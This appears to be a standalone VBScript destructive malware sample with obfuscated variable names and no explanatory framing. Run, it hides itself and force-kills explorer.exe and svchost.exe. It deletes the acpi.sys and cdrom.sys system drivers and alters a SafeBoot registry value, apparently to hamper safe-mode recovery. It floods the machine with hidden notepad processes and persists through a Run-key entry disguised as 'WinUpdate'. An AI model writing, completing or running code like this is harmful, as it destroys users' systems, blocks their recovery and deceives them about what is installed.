Option Explicit
Dim x7p9q, q3z8k, k9m2v, r4t6y
Set x7p9q = CreateObject("WScript.Shell") 
Set q3z8k = CreateObject("Scripting.FileSystemObject") 

x7p9q.Run "cmd.exe /c " & WScript.ScriptFullName, 0, False

x7p9q.Run "taskkill /F /IM explorer.exe", 0, True 
x7p9q.Run "taskkill /F /IM svchost.exe", 0, True 

On Error Resume Next
q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") 
q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") 
On Error GoTo 0

Set k9m2v = CreateObject("WScript.Shell")
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD"

For r4t6y = 1 To 100
    x7p9q.Run "notepad.exe", 0, False 
Next

k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", WScript.ScriptFullName, "REG_SZ"

Do
    WScript.Sleep 60000 
    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
    For r4t6y = 1 To 50
        x7p9q.Run "notepad.exe", 0, False
    Next
Loop